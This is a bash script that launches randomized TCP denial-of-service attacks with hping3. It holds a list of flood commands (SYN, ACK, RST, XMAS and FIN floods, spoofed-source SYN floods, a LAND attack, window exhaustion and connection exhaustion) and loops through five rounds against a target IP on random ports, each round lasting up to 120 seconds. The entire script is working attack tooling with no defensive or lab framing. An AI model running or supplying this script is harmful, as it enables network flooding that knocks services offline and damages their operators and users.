#!/bin/bash

# Randomize attack vectors
attack_vectors=(
    "hping3 -S --flood -p $TARGET_PORT $TARGET_IP"  # SYN Flood
    "hping3 -A --flood -p $TARGET_PORT $TARGET_IP"  # ACK Flood
    "hping3 -R --flood -p $TARGET_PORT $TARGET_IP"  # RST Flood
    "hping3 -F -P -U --flood -p $TARGET_PORT $TARGET_IP"  # XMAS Flood
    "hping3 -F --flood -p $TARGET_PORT $TARGET_IP"  # FIN Flood
    "hping3 -S -p $TARGET_PORT --rand-source --flood $TARGET_IP"  # Random SYN Flood
    "hping3 -S -p $TARGET_PORT -a $TARGET_IP $TARGET_IP"  # LAND Attack
    "hping3 -S -p $TARGET_PORT --tcp-mss 1 --flood $TARGET_IP"  # TCP Window Exhaustion
    "for i in {1..5000}; do hping3 -S -p $TARGET_PORT -c 1 $TARGET_IP; done"  # Connection Exhaustion
)

# Run attack for 120 seconds maximum
attack_duration=120

# Attack loop
for i in {1..5}; do
    # Randomize target port (between 1 and 65535)
    TARGET_PORT=$((RANDOM % 65535 + 1))

    # Select a random attack vector
    RANDOM_ATTACK=${attack_vectors[$RANDOM % ${#attack_vectors[@]}]}

    echo "🔥 Starting TCP DoS Attack on $TARGET_IP:$TARGET_PORT"
    echo "🚀 Attack Type: $RANDOM_ATTACK"
    
    # Execute attack in background with timeout of 120 seconds
    timeout $attack_duration bash -c "$RANDOM_ATTACK &"
    
    # Random sleep time between 6 and 15 seconds
    SLEEP_TIME=$((6 + RANDOM % 10))  # Random sleep between 6 and 15 seconds
    
    echo "⏳ Attack completed. Pausing for $SLEEP_TIME seconds..."
    sleep $SLEEP_TIME
done

echo "⚡ All attacks completed."
